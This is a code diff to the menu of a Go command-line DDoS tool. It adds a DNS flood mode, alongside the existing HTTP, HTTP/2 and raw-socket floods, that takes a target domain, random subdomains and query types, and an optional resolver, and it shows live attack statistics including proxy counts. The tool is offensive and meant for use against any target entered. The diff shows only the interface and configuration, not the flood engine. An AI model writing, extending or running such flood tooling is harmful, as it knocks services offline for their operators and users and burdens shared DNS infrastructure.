@@ -583,12 +583,13 @@ func (m *Menu) ddosAttack() {
 			fmt.Println("✓ All efficiency features enabled (default)")
 		}
 
-		// Attack Mode (simplified to 3 modes)
+		// Attack Mode (simplified to 4 modes)
 		fmt.Println("\nSelect Attack Mode:")
 		fmt.Println("  [1] HTTP Flood - Maximum concurrent HTTP requests (Default, most efficient)")
 		fmt.Println("  [2] HTTP/2     - Flood with HTTP/2 streams (HTTPS targets)")
 		fmt.Println("  [3] Raw Socket - Maximum throughput using raw TCP (HTTP targets)")
-		fmt.Print("Enter choice (1-3, default: 1): ")
+		fmt.Println("  [4] DNS Flood  - UDP-based DNS query flood (lightweight and powerful)")
+		fmt.Print("Enter choice (1-4, default: 1): ")
 		modeChoice, _ := reader.ReadString('\n')
 		modeChoice = strings.TrimSpace(modeChoice)
 
@@ -600,6 +601,9 @@ func (m *Menu) ddosAttack() {
 		case "3":
 			attackMode = ddos.ModeRaw
 			fmt.Println("✓ Raw Socket mode selected")
+		case "4":
+			attackMode = ddos.ModeDNS
+			fmt.Println("✓ DNS Flood mode selected")
 		default:
 			attackMode = ddos.ModeFlood
 			fmt.Println("✓ HTTP Flood mode selected")
@@ -692,6 +696,79 @@ func (m *Menu) ddosAttack() {
 			fmt.Printf("✓ Max streams per connection: %d\n", maxStreamsPerConn)
 		}
 
+		// DNS Flood settings
+		var dnsTargetDomain string
+		var dnsQueryTypes []string
+		var dnsRandomSubdomains bool
+		var dnsResolverIP string
+		if attackMode == ddos.ModeDNS {
+			fmt.Println("\n===== DNS Flood Configuration =====")
+
+			// Target domain
+			fmt.Print("Enter target domain (e.g., example.com): ")
+			domainInput, _ := reader.ReadString('\n')
+			dnsTargetDomain = strings.TrimSpace(domainInput)
+			if dnsTargetDomain == "" {
+				// Try to extract from TargetURL
+				if baseConfig.TargetURL != "" {
+					url := baseConfig.TargetURL
+					if strings.HasPrefix(url, "http://") {
+						url = strings.TrimPrefix(url, "http://")
+					} else if strings.HasPrefix(url, "https://") {
+						url = strings.TrimPrefix(url, "https://")
+					}
+					if idx := strings.Index(url, "/"); idx != -1 {
+						url = url[:idx]
+					}
+					if idx := strings.Index(url, ":"); idx != -1 {
+						url = url[:idx]
+					}
+					dnsTargetDomain = url
+					fmt.Printf("✓ Using domain from URL: %s\n", dnsTargetDomain)
+				} else {
+					fmt.Println("Error: Target domain is required for DNS flood attack")
+					return
+				}
+			}
+
+			// Query types
+			fmt.Print("Enter DNS query types (comma-separated: A,AAAA,MX,TXT,NS) or press Enter for random: ")
+			queryTypesStr, _ := reader.ReadString('\n')
+			queryTypesStr = strings.TrimSpace(queryTypesStr)
+			if queryTypesStr != "" {
+				types := strings.Split(queryTypesStr, ",")
+				for i := range types {
+					types[i] = strings.TrimSpace(strings.ToUpper(types[i]))
+				}
+				dnsQueryTypes = types
+				fmt.Printf("✓ Query types: %v\n", dnsQueryTypes)
+			} else {
+				dnsQueryTypes = []string{} // Empty = random
+				fmt.Println("✓ Using random query types")
+			}
+
+			// Random subdomains
+			fmt.Print("Generate random subdomains? (y/n, default: y): ")
+			randomSubStr, _ := reader.ReadString('\n')
+			randomSubStr = strings.TrimSpace(strings.ToLower(randomSubStr))
+			dnsRandomSubdomains = randomSubStr == "" || randomSubStr == "y" || randomSubStr == "yes"
+			if dnsRandomSubdomains {
+				fmt.Println("✓ Random subdomains enabled")
+			} else {
+				fmt.Println("✓ Random subdomains disabled")
+			}
+
+			// DNS resolver (optional)
+			fmt.Print("Enter DNS resolver IP (or press Enter to auto-detect): ")
+			resolverStr, _ := reader.ReadString('\n')
+			dnsResolverIP = strings.TrimSpace(resolverStr)
+			if dnsResolverIP != "" {
+				fmt.Printf("✓ Using DNS resolver: %s\n", dnsResolverIP)
+			} else {
+				fmt.Println("✓ Auto-detecting DNS resolver")
+			}
+		}
+
 		// Timeout
 		fmt.Print("Enter request timeout in seconds (default: 5): ")
 		timeoutStr, _ := reader.ReadString('\n')
@@ -717,6 +794,13 @@ func (m *Menu) ddosAttack() {
 			config.UserAgentFile = baseConfig.UserAgentFile
 			// Apply HTTP/2 settings
 			config.MaxStreamsPerConn = maxStreamsPerConn
+			// Apply DNS settings
+			if attackMode == ddos.ModeDNS {
+				config.DNSTargetDomain = dnsTargetDomain
+				config.DNSQueryTypes = dnsQueryTypes
+				config.DNSRandomSubdomains = dnsRandomSubdomains
+				config.DNSResolverIP = dnsResolverIP
+			}
 			// Apply efficiency features
 			config.EnableConnectionPooling = enableConnectionPooling
 			config.EnableFireAndForget = enableFireAndForget
@@ -754,6 +838,20 @@ func (m *Menu) ddosAttack() {
 		// Deprecated modes and settings removed (simplified)
 		if firstConfig.AttackMode == ddos.ModeHTTP2 {
 			fmt.Printf("Max Streams/Conn:   %d\n", firstConfig.MaxStreamsPerConn)
+		}
+		if firstConfig.AttackMode == ddos.ModeDNS {
+			fmt.Printf("DNS Target Domain:  %s\n", firstConfig.DNSTargetDomain)
+			if len(firstConfig.DNSQueryTypes) > 0 {
+				fmt.Printf("DNS Query Types:    %v\n", firstConfig.DNSQueryTypes)
+			} else {
+				fmt.Printf("DNS Query Types:    Random\n")
+			}
+			fmt.Printf("Random Subdomains:   %v\n", firstConfig.DNSRandomSubdomains)
+			if firstConfig.DNSResolverIP != "" {
+				fmt.Printf("DNS Resolver:       %s\n", firstConfig.DNSResolverIP)
+			} else {
+				fmt.Printf("DNS Resolver:       Auto-detect\n")
+			}
 		}
 		fmt.Println(strings.Repeat("=", 70))
 
@@ -805,6 +903,20 @@ startAttack:
 		if firstConfig.AttackMode == ddos.ModeHTTP2 {
 			fmt.Printf("Max Streams/Conn:   %d\n", firstConfig.MaxStreamsPerConn)
 		}
+		if firstConfig.AttackMode == ddos.ModeDNS {
+			fmt.Printf("DNS Target Domain:  %s\n", firstConfig.DNSTargetDomain)
+			if len(firstConfig.DNSQueryTypes) > 0 {
+				fmt.Printf("DNS Query Types:    %v\n", firstConfig.DNSQueryTypes)
+			} else {
+				fmt.Printf("DNS Query Types:    Random\n")
+			}
+			fmt.Printf("Random Subdomains:   %v\n", firstConfig.DNSRandomSubdomains)
+			if firstConfig.DNSResolverIP != "" {
+				fmt.Printf("DNS Resolver:       %s\n", firstConfig.DNSResolverIP)
+			} else {
+				fmt.Printf("DNS Resolver:       Auto-detect\n")
+			}
+		}
 		fmt.Println(strings.Repeat("=", 70))
 	}
 
@@ -841,7 +953,7 @@ startAttack:
 		}(attack)
 	}
 
-	// Display progress in real-time
+	// Display progress in real-time (single line, no newlines)
 	go func() {
 		ticker := time.NewTicker(500 * time.Millisecond)
 		defer ticker.Stop()
@@ -849,11 +961,13 @@ startAttack:
 		for {
 			select {
 			case <-ctx.Done():
+				// Clear the progress line on exit
+				fmt.Print("\r\033[K")
 				return
 			case <-ticker.C:
 				progressMutex.Lock()
-				// Clear previous output and display stats
-				fmt.Print("\r\033[K") // Clear line
+				// Clear previous output and display stats (single line update)
+				fmt.Print("\r\033[K") // Carriage return + clear to end of line
 
 				var totalSent, totalSuccess, totalFailed int64
 				var totalRPS float64
@@ -885,6 +999,7 @@ startAttack:
 						proxyInfo = fmt.Sprintf(" | Proxies (active/disabled): %d/%d", totalActiveProxies, totalDisabledProxies)
 					}
 
+					// Print on same line (no newline)
 					fmt.Printf("⏱  Elapsed: %s | Remaining: %s | Sent: %d | Success: %d | Failed: %d | RPS: %.0f%s",
 						ddos.FormatDuration(elapsed),
 						ddos.FormatDuration(remaining),
@@ -893,6 +1008,9 @@ startAttack:
 						totalFailed,
 						totalRPS,
 						proxyInfo)
+
+					// Flush output to ensure it displays immediately
+					os.Stdout.Sync()
 				}
 				progressMutex.Unlock()
 			}
@@ -902,8 +1020,11 @@ startAttack:
 	// Wait for all attacks to complete
 	wg.Wait()
 
+	// Clear the progress line and print final stats
+	fmt.Print("\r\033[K\n") // Clear progress line and move to new line
+
 	// Final stats
-	fmt.Println("\n\n" + strings.Repeat("=", 70))
+	fmt.Println(strings.Repeat("=", 70))
 	fmt.Println("                    ATTACK COMPLETE")
 	fmt.Println(strings.Repeat("=", 70))
 
